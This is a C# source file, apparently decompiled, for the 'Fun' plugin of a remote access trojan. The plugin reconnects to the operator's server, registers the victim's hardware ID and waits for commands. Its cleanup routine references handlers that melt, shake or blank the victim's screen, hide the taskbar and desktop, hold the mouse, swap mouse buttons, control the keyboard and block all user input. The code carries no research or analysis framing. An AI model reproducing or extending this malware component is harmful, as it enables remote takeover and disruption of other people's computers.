using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Handler;
using Plugin.Handler.GDI;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			Client.Send(LEB128.Write(new object[3] { "Fun", "Connect", Hwid }));
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		Thread.Sleep(5000);
		HandleDark.Stop();
		HandleDumpVD.Stop();
		HandleInvertColor.Stop();
		HandleInvertSmelt.Stop();
		HandleRgbtrain.Stop();
		HandleSetpixel.Stop();
		HandleShake.Stop();
		HandleSinewaves.Stop();
		HandleSmelt.Stop();
		HandleStripes.Stop();
		HandleTrain1.Stop();
		HandleTrain2.Stop();
		HandleTrain3.Stop();
		HandleTunnel.Stop();
		HandleVerticalWide.Stop();
		HandleWef.Stop();
		HandleWide.Stop();
		HandleFuckScreen.Stop();
		HandleHoldMouse.Stop();
		HandleLed.Stop();
		HandleKeyBoard.Stop();
		new HandleBlankScreen().Stop();
		new HandleTaskbar().Show();
		new HandleDesktop().Show();
		new HandleMouseButton().RestoreMouseButtons();
		Native.BlockInput(fBlockIt: false);
	}
}
